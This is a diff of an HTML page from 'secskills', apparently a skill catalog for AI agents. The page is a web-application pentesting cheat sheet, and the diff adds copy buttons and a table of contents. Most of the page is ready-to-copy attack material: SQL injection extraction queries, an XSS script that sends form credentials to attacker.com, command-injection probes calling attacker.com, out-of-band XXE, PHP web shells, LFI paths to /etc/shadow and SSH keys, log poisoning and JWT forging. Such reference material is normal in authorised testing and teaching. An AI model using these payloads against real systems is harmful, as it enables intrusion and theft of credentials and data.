@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,10 +47,11 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Test web applications for security vulnerabilities including SQLi, XSS, command injection, JWT attacks, SSRF, file uploads, XXE, and API flaws. Use when pentesting web apps, analyzing authentication, or exploiting OWASP Top 10 vulnerabilities.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><h2>When to Use</h2>
+<div class="wrap slayout"><article><h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>Pentesting web applications</li>
 <li>Testing authentication/authorization</li>
@@ -48,7 +60,7 @@
 <li>Testing file upload functionality</li>
 <li>API security assessment</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Source code is available</strong> — use <a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a> first;</li>
 </ul>
@@ -77,102 +89,163 @@
 <ul>
 <li><strong>An endpoint that parses XML, SVG, or Office files</strong> — use <a class="xref" href="exploiting-xxe.html"><code>exploiting-xxe</code></a></li>
 </ul>
-<h2>SQL Injection</h2>
+<h2 id="sql-injection">SQL Injection</h2>
 <p><strong>Quick Detection:</strong></p>
-<pre><code># Test basic payloads
+<div class="codeblk cx"><button class="copy" data-copy="# Test basic payloads
+&#x27;
+&quot;
+`
+&#x27; OR &#x27;1&#x27;=&#x27;1
+&quot; OR &quot;1&quot;=&quot;1
+&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--">copy</button><pre><code># Test basic payloads
 '
 "
 `
 ' OR '1'='1
 " OR "1"="1
-' OR '1'='1'--</code></pre>
+' OR '1'='1'--</code></pre></div>
 <p><strong>Union-Based SQLi:</strong></p>
-<pre><code># Find column count
+<div class="codeblk cx"><button class="copy" data-copy="# Find column count
+&#x27; ORDER BY 1--
+&#x27; ORDER BY 2--
+&#x27; ORDER BY 3--
+
+# Extract data
+&#x27; UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+&#x27; UNION SELECT NULL,username,password FROM users--">copy</button><pre><code># Find column count
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
 
 # Extract data
 ' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
-' UNION SELECT NULL,username,password FROM users--</code></pre>
+' UNION SELECT NULL,username,password FROM users--</code></pre></div>
 <p><strong>Time-Based Blind:</strong></p>
-<pre><code>-- MySQL
+<div class="codeblk cx"><button class="copy" data-copy="-- MySQL
+&#x27; AND SLEEP(5)--
+
+-- PostgreSQL
+&#x27; AND pg_sleep(5)--
+
+-- MSSQL
+&#x27; WAITFOR DELAY &#x27;0:0:5&#x27;--">copy</button><pre><code>-- MySQL
 ' AND SLEEP(5)--
 
 -- PostgreSQL
 ' AND pg_sleep(5)--
 
 -- MSSQL
-' WAITFOR DELAY '0:0:5'--</code></pre>
+' WAITFOR DELAY '0:0:5'--</code></pre></div>
 <p><strong>Automated Testing:</strong></p>
-<pre><code># SQLMap
+<div class="codeblk cx"><button class="copy" data-copy="# SQLMap
+sqlmap -u &quot;http://target.com/page?id=1&quot; --batch --dbs
+sqlmap -u &quot;http://target.com/page?id=1&quot; -D database --tables
+sqlmap -u &quot;http://target.com/page?id=1&quot; -D database -T users --dump
+sqlmap -r request.txt -p parameter_name">copy</button><pre><code># SQLMap
 sqlmap -u "http://target.com/page?id=1" --batch --dbs
 sqlmap -u "http://target.com/page?id=1" -D database --tables
 sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
-sqlmap -r request.txt -p parameter_name</code></pre>
-<h2>Cross-Site Scripting (XSS)</h2>
+sqlmap -r request.txt -p parameter_name</code></pre></div>
+<h2 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h2>
 <p><strong>Quick Payloads:</strong></p>
-<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+<div class="codeblk cx"><button class="copy" data-copy="&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;
+&lt;body onload=alert(1)&gt;">copy</button><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
 &lt;img src=x onerror=alert(1)&gt;
 &lt;svg onload=alert(1)&gt;
 &lt;iframe src="javascript:alert(1)"&gt;
-&lt;body onload=alert(1)&gt;</code></pre>
+&lt;body onload=alert(1)&gt;</code></pre></div>
 <p><strong>Filter Bypasses:</strong></p>
-<pre><code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+<div class="codeblk cx"><button class="copy" data-copy="&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
 &lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
 &lt;svg/onload=alert(1)&gt;
-&lt;img src=x onerror="alert(1)"&gt;</code></pre>
+&lt;img src=x onerror=&quot;alert(1)&quot;&gt;">copy</button><pre><code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;img src=x onerror="alert(1)"&gt;</code></pre></div>
 <p><strong>Steal Credentials:</strong></p>
-<pre><code>&lt;script&gt;
+<div class="codeblk cx"><button class="copy" data-copy="&lt;script&gt;
+document.forms[0].onsubmit = function(){
+  fetch(&#x27;http://attacker.com?&#x27;+new URLSearchParams(new FormData(this)));
+};
+&lt;/script&gt;">copy</button><pre><code>&lt;script&gt;
 document.forms[0].onsubmit = function(){
   fetch('http://attacker.com?'+new URLSearchParams(new FormData(this)));
 };
-&lt;/script&gt;</code></pre>
+&lt;/script&gt;</code></pre></div>
 <p><strong>Tools:</strong></p>
-<pre><code>dalfox url http://target.com/search?q=test
-XSStrike -u "http://target.com/search?q=test"</code></pre>
-<h2>Command Injection</h2>
+<div class="codeblk cx"><button class="copy" data-copy="dalfox url http://target.com/search?q=test
+XSStrike -u &quot;http://target.com/search?q=test&quot;">copy</button><pre><code>dalfox url http://target.com/search?q=test
+XSStrike -u "http://target.com/search?q=test"</code></pre></div>
+<h2 id="command-injection">Command Injection</h2>
 <p><strong>Basic Operators:</strong></p>
-<pre><code>;whoami
+<div class="codeblk cx"><button class="copy" data-copy=";whoami
 |whoami
 ||whoami
 &amp;whoami
 &amp;&amp;whoami
 `whoami`
 $(whoami)
-%0Awhoami  # Newline (best)</code></pre>
+%0Awhoami  # Newline (best)">copy</button><pre><code>;whoami
+|whoami
+||whoami
+&amp;whoami
+&amp;&amp;whoami
+`whoami`
+$(whoami)
+%0Awhoami  # Newline (best)</code></pre></div>
 <p><strong>Blind Detection:</strong></p>
-<pre><code>&amp; sleep 10 &amp;
+<div class="codeblk cx"><button class="copy" data-copy="&amp; sleep 10 &amp;
 &amp; nslookup attacker.com &amp;
-&amp; curl http://attacker.com &amp;</code></pre>
+&amp; curl http://attacker.com &amp;">copy</button><pre><code>&amp; sleep 10 &amp;
+&amp; nslookup attacker.com &amp;
+&amp; curl http://attacker.com &amp;</code></pre></div>
 <p><strong>Common Parameters:</strong></p>
-<pre><code>?cmd=, ?exec=, ?command=, ?ping=, ?query=, ?code=, ?do=</code></pre>
-<h2>JWT Attacks</h2>
+<div class="codeblk cx"><button class="copy" data-copy="?cmd=, ?exec=, ?command=, ?ping=, ?query=, ?code=, ?do=">copy</button><pre><code>?cmd=, ?exec=, ?command=, ?ping=, ?query=, ?code=, ?do=</code></pre></div>
+<h2 id="jwt-attacks">JWT Attacks</h2>
 <p><strong>Quick Testing:</strong></p>
-<pre><code># jwt_tool - run all tests
+<div class="codeblk cx"><button class="copy" data-copy="# jwt_tool - run all tests
+python3 jwt_tool.py -M at -t &quot;https://api.target.com/endpoint&quot; -rh &quot;Authorization: Bearer TOKEN&quot;
+
+# Specific attacks
+python3 jwt_tool.py TOKEN -X a  # Algorithm confusion
+python3 jwt_tool.py TOKEN -X n  # None algorithm
+python3 jwt_tool.py TOKEN -X k  # Key confusion RS256-&gt;HS256">copy</button><pre><code># jwt_tool - run all tests
 python3 jwt_tool.py -M at -t "https://api.target.com/endpoint" -rh "Authorization: Bearer TOKEN"
 
 # Specific attacks
 python3 jwt_tool.py TOKEN -X a  # Algorithm confusion
 python3 jwt_tool.py TOKEN -X n  # None algorithm
-python3 jwt_tool.py TOKEN -X k  # Key confusion RS256-&gt;HS256</code></pre>
+python3 jwt_tool.py TOKEN -X k  # Key confusion RS256-&gt;HS256</code></pre></div>
 <p><strong>Manual Testing:</strong></p>
-<pre><code># Decode JWT
+<div class="codeblk cx"><button class="copy" data-copy="# Decode JWT
+echo &quot;eyJhbGc...&quot; | base64 -d
+
+# Change algorithm to &quot;none&quot;
+{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}
+
+# Brute force secret
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt">copy</button><pre><code># Decode JWT
 echo "eyJhbGc..." | base64 -d
 
 # Change algorithm to "none"
 {"alg":"none","typ":"JWT"}
 
 # Brute force secret
-hashcat -a 0 -m 16500 jwt.txt wordlist.txt</code></pre>
-<h2>SSRF (Server-Side Request Forgery)</h2>
+hashcat -a 0 -m 16500 jwt.txt wordlist.txt</code></pre></div>
+<h2 id="ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery)</h2>
 <p><strong>Basic Payloads:</strong></p>
-<pre><code>http://127.0.0.1
+<div class="codeblk cx"><button class="copy" data-copy="http://127.0.0.1
 http://localhost
 http://169.254.169.254/  # AWS metadata
-http://[::1]  # IPv6 localhost</code></pre>
+http://[::1]  # IPv6 localhost">copy</button><pre><code>http://127.0.0.1
+http://localhost
+http://169.254.169.254/  # AWS metadata
+http://[::1]  # IPv6 localhost</code></pre></div>
 <p><strong>Cloud Metadata:</strong></p>
-<pre><code># AWS
+<div class="codeblk cx"><button class="copy" data-copy="# AWS
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
@@ -180,88 +253,141 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://metadata.google.internal/computeMetadata/v1/
 
 # Azure
-http://169.254.169.254/metadata/instance?api-version=2021-02-01</code></pre>
+http://169.254.169.254/metadata/instance?api-version=2021-02-01">copy</button><pre><code># AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Google Cloud
+http://metadata.google.internal/computeMetadata/v1/
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01</code></pre></div>
 <p><strong>Bypasses:</strong></p>
-<pre><code>http://2130706433/  # Decimal
+<div class="codeblk cx"><button class="copy" data-copy="http://2130706433/  # Decimal
 http://0x7f000001/  # Hex
 http://127.1/  # Short form
-http://127.0.0.1.nip.io</code></pre>
-<h2>File Upload</h2>
+http://127.0.0.1.nip.io">copy</button><pre><code>http://2130706433/  # Decimal
+http://0x7f000001/  # Hex
+http://127.1/  # Short form
+http://127.0.0.1.nip.io</code></pre></div>
+<h2 id="file-upload">File Upload</h2>
 <p><strong>Bypass Extensions:</strong></p>
-<pre><code>shell.php.jpg
+<div class="codeblk cx"><button class="copy" data-copy="shell.php.jpg
 shell.jpg.php
 shell.php%00.jpg
 shell.phP
 shell.php5
-shell.phtml</code></pre>
+shell.phtml">copy</button><pre><code>shell.php.jpg
+shell.jpg.php
+shell.php%00.jpg
+shell.phP
+shell.php5
+shell.phtml</code></pre></div>
 <p><strong>Magic Bytes:</strong></p>
-<pre><code>GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="GIF89a&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;">copy</button><pre><code>GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code></pre></div>
 <p><strong>Simple Web Shells:</strong></p>
-<pre><code>&lt;?php system($_GET['cmd']); ?&gt;
+<div class="codeblk cx"><button class="copy" data-copy="&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;
 &lt;?=`$_GET[0]`?&gt;
-&lt;?php passthru($_GET['cmd']); ?&gt;</code></pre>
-<h2>XXE (XML External Entity)</h2>
+&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;">copy</button><pre><code>&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?=`$_GET[0]`?&gt;
+&lt;?php passthru($_GET['cmd']); ?&gt;</code></pre></div>
+<h2 id="xxe-xml-external-entity">XXE (XML External Entity)</h2>
 <p><strong>Basic XXE:</strong></p>
-<pre><code>&lt;?xml version="1.0"?&gt;
+<div class="codeblk cx"><button class="copy" data-copy="&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;">copy</button><pre><code>&lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
-&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre></div>
 <p><strong>Out-of-Band XXE:</strong></p>
-<pre><code>&lt;?xml version="1.0"?&gt;
+<div class="codeblk cx"><button class="copy" data-copy="&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;%xxe;]&gt;
+&lt;root&gt;&lt;/root&gt;">copy</button><pre><code>&lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt;%xxe;]&gt;
-&lt;root&gt;&lt;/root&gt;</code></pre>
+&lt;root&gt;&lt;/root&gt;</code></pre></div>
 <p><strong>SVG XXE:</strong></p>
-<pre><code>&lt;?xml version="1.0" standalone="yes"?&gt;
+<div class="codeblk cx"><button class="copy" data-copy="&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;
+&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+&lt;text&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;">copy</button><pre><code>&lt;?xml version="1.0" standalone="yes"?&gt;
 &lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
 &lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
 &lt;text&gt;&amp;xxe;&lt;/text&gt;
-&lt;/svg&gt;</code></pre>
-<h2>LFI/RFI (Local/Remote File Inclusion)</h2>
+&lt;/svg&gt;</code></pre></div>
+<h2 id="lfi-rfi-local-remote-file-inclusion">LFI/RFI (Local/Remote File Inclusion)</h2>
 <p><strong>Path Traversal:</strong></p>
-<pre><code>../../../etc/passwd
+<div class="codeblk cx"><button class="copy" data-copy="../../../etc/passwd
 ....//....//....//etc/passwd
 ..%2F..%2F..%2Fetc%2Fpasswd
-..%252F..%252F..%252Fetc%252Fpasswd</code></pre>
+..%252F..%252F..%252Fetc%252Fpasswd">copy</button><pre><code>../../../etc/passwd
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd</code></pre></div>
 <p><strong>Common Targets (Linux):</strong></p>
-<pre><code>/etc/passwd
+<div class="codeblk cx"><button class="copy" data-copy="/etc/passwd
 /etc/shadow
 /var/log/apache2/access.log
 /var/www/html/config.php
 ~/.ssh/id_rsa
-~/.bash_history</code></pre>
+~/.bash_history">copy</button><pre><code>/etc/passwd
+/etc/shadow
+/var/log/apache2/access.log
+/var/www/html/config.php
+~/.ssh/id_rsa
+~/.bash_history</code></pre></div>
 <p><strong>Common Targets (Windows):</strong></p>
-<pre><code>C:\Windows\System32\drivers\etc\hosts
+<div class="codeblk cx"><button class="copy" data-copy="C:\Windows\System32\drivers\etc\hosts
 C:\Windows\win.ini
-C:\xampp\apache\conf\httpd.conf</code></pre>
+C:\xampp\apache\conf\httpd.conf">copy</button><pre><code>C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\xampp\apache\conf\httpd.conf</code></pre></div>
 <p><strong>PHP Wrappers:</strong></p>
-<pre><code>php://filter/convert.base64-encode/resource=index.php
+<div class="codeblk cx"><button class="copy" data-copy="php://filter/convert.base64-encode/resource=index.php
+php://input  # POST: &lt;?php system(&#x27;whoami&#x27;); ?&gt;
+data://text/plain,&lt;?php system(&#x27;whoami&#x27;); ?&gt;
+expect://whoami">copy</button><pre><code>php://filter/convert.base64-encode/resource=index.php
 php://input  # POST: &lt;?php system('whoami'); ?&gt;
 data://text/plain,&lt;?php system('whoami'); ?&gt;
-expect://whoami</code></pre>
+expect://whoami</code></pre></div>
 <p><strong>Log Poisoning:</strong></p>
-<pre><code># Poison Apache log
+<div class="codeblk cx"><button class="copy" data-copy="# Poison Apache log
+curl &quot;http://target.com/&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot;
+
+# Include log
+http://target.com/page.php?file=/var/log/apache2/access.log&amp;cmd=whoami">copy</button><pre><code># Poison Apache log
 curl "http://target.com/&lt;?php system(\$_GET['cmd']); ?&gt;"
 
 # Include log
-http://target.com/page.php?file=/var/log/apache2/access.log&amp;cmd=whoami</code></pre>
-<h2>API Testing</h2>
+http://target.com/page.php?file=/var/log/apache2/access.log&amp;cmd=whoami</code></pre></div>
+<h2 id="api-testing">API Testing</h2>
 <p><strong>Common API Paths:</strong></p>
-<pre><code>/api/v1/
+<div class="codeblk cx"><button class="copy" data-copy="/api/v1/
 /api/v2/
 /graphql
 /swagger.json
-/api-docs</code></pre>
+/api-docs">copy</button><pre><code>/api/v1/
+/api/v2/
+/graphql
+/swagger.json
+/api-docs</code></pre></div>
 <p><strong>IDOR Testing:</strong></p>
-<pre><code># Change IDs
+<div class="codeblk cx"><button class="copy" data-copy="# Change IDs
 curl https://api.target.com/users/1
 curl https://api.target.com/users/2
-curl https://api.target.com/users/2 -H "Authorization: Bearer USER1_TOKEN"</code></pre>
+curl https://api.target.com/users/2 -H &quot;Authorization: Bearer USER1_TOKEN&quot;">copy</button><pre><code># Change IDs
+curl https://api.target.com/users/1
+curl https://api.target.com/users/2
+curl https://api.target.com/users/2 -H "Authorization: Bearer USER1_TOKEN"</code></pre></div>
 <p><strong>Mass Assignment:</strong></p>
-<pre><code># Add admin fields
+<div class="codeblk cx"><button class="copy" data-copy="# Add admin fields
+curl -X POST https://api.target.com/users \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#x27;{&quot;username&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;is_admin&quot;:true}&#x27;">copy</button><pre><code># Add admin fields
 curl -X POST https://api.target.com/users \
   -H "Content-Type: application/json" \
-  -d '{"username":"test","email":"test@test.com","role":"admin","is_admin":true}'</code></pre>
+  -d '{"username":"test","email":"test@test.com","role":"admin","is_admin":true}'</code></pre></div>
 <p><strong>GraphQL Introspection:</strong></p>
-<pre><code>{
+<div class="codeblk cx"><button class="copy" data-copy="{
   __schema {
     types {
       name
@@ -270,19 +396,32 @@ curl -X POST https://api.target.com/users \
       }
     }
   }
-}</code></pre>
-<h2>Tools</h2>
+}">copy</button><pre><code>{
+  __schema {
+    types {
+      name
+      fields {
+        name
+      }
+    }
+  }
+}</code></pre></div>
+<h2 id="tools">Tools</h2>
 <p><strong>Enumeration:</strong></p>
-<pre><code>ffuf -u http://target.com/FUZZ -w wordlist.txt
+<div class="codeblk cx"><button class="copy" data-copy="ffuf -u http://target.com/FUZZ -w wordlist.txt
 gobuster dir -u http://target.com -w wordlist.txt
-feroxbuster -u http://target.com -w wordlist.txt</code></pre>
+feroxbuster -u http://target.com -w wordlist.txt">copy</button><pre><code>ffuf -u http://target.com/FUZZ -w wordlist.txt
+gobuster dir -u http://target.com -w wordlist.txt
+feroxbuster -u http://target.com -w wordlist.txt</code></pre></div>
 <p><strong>Vulnerability Scanning:</strong></p>
-<pre><code>nikto -h http://target.com
-nuclei -u http://target.com -t ~/nuclei-templates/</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="nikto -h http://target.com
+nuclei -u http://target.com -t ~/nuclei-templates/">copy</button><pre><code>nikto -h http://target.com
+nuclei -u http://target.com -t ~/nuclei-templates/</code></pre></div>
 <p><strong>Parameter Discovery:</strong></p>
-<pre><code>arjun -u http://target.com/page
-paramspider -d target.com</code></pre>
-<h2>Quick Reference</h2>
+<div class="codeblk cx"><button class="copy" data-copy="arjun -u http://target.com/page
+paramspider -d target.com">copy</button><pre><code>arjun -u http://target.com/page
+paramspider -d target.com</code></pre></div>
+<h2 id="quick-reference">Quick Reference</h2>
 <p><strong>Start Testing:</strong></p>
 <ol>
 <li>Run directory enumeration (ffuf/gobuster)</li>
@@ -302,7 +441,7 @@ paramspider -d target.com</code></pre>
 <li>File upload bypasses</li>
 <li>Command injection in system utilities</li>
 </ul>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Initial Access</strong> (TA0001)</p>
 <ul>
@@ -321,11 +460,14 @@ paramspider -d target.com</code></pre>
 <li><a href="https://attack.mitre.org/techniques/T1539/">T1539</a> Steal Web Session Cookie</li>
 </ul>
 <p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <p>See HackTricks for detailed techniques:</p>
 <ul>
 <li>https://book.hacktricks.xyz/pentesting-web</li>
 <li>https://portswigger.net/web-security</li>
 <li>https://owasp.org/www-project-web-security-testing-guide/</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#sql-injection">SQL Injection</a><a href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a><a href="#command-injection">Command Injection</a><a href="#jwt-attacks">JWT Attacks</a><a href="#ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery)</a><a href="#file-upload">File Upload</a><a href="#xxe-xml-external-entity">XXE (XML External Entity)</a><a href="#lfi-rfi-local-remote-file-inclusion">LFI/RFI (Local/Remote File Inclusion)</a><a href="#api-testing">API Testing</a><a href="#tools">Tools</a><a href="#quick-reference">Quick Reference</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
